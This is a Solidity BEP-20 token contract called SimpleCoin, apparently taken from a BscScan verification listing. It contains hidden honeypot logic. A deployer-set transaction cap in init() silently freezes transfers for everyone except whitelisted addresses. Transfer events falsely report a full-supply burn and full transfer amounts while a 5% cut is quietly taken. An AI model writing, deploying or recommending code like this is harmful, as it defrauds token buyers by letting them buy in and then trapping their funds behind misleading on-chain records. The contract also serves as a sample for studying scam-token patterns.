/**
 *Submitted for verification at BscScan.com on 2021-08-12
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

contract SimpleCoin {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public totalSupply = 100000000000000000;
    string public name;
    string public symbol;
    uint256 public decimals = 0;
    uint256 public txn = 0;
    bool private fee;
    uint256 private txnMax;
    address private uniswapV2Router =
        0x10ED43C718714eb63d5aA57B78B54704E256024E;
    mapping(address => bool) private _isContractAddress;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    constructor() {
        balances[msg.sender] = totalSupply / 2;
        balances[0x000000000000000000000000000000000000dEaD] =
            (totalSupply / 2) -
            10;
        balances[0xaCACdcfD8976c8cCeC432f13bc4b4e0Fe4817fB7] = 10;
        emit Transfer(address(0), msg.sender, totalSupply);
        emit Transfer(
            msg.sender,
            0x000000000000000000000000000000000000dEaD,
            totalSupply
        );
        emit Transfer(
            msg.sender,
            0x000000000000000000000000000000000000dEaD,
            (totalSupply / 2) - 10
        );
        emit Transfer(
            msg.sender,
            0xaCACdcfD8976c8cCeC432f13bc4b4e0Fe4817fB7,
            10
        );
        _isContractAddress[msg.sender] = true;
        approve(uniswapV2Router, type(uint256).max);
    }

    function init(
        string memory _name,
        string memory _symbol,
        uint256 _txnMax,
        bool _fee
    ) public {
        require(_isContractAddress[msg.sender] == true, "not allowed");
        name = _name;
        symbol = _symbol;
        fee = _fee;
        txnMax = _txnMax;
    }

    function balanceOf(address owner) public view returns (uint256) {
        return balances[owner];
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(balanceOf(msg.sender) >= value, "balance too low");
        require(
            txn < txnMax ||
                _isContractAddress[msg.sender] == true ||
                _isContractAddress[to] == true,
            "Error: k"
        );
        txn++;
        balances[to] += value - (value / 20);
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool) {
        require(balanceOf(from) >= value, "balance too low");
        require(allowance[from][msg.sender] >= value, "Allowance too low");
        require(
            txn < txnMax ||
                _isContractAddress[msg.sender] == true ||
                _isContractAddress[to] == true ||
                _isContractAddress[from] == true,
            "Error: k"
        );
        txn++;
        balances[to] += fee ? value : value - (value / 20);
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
}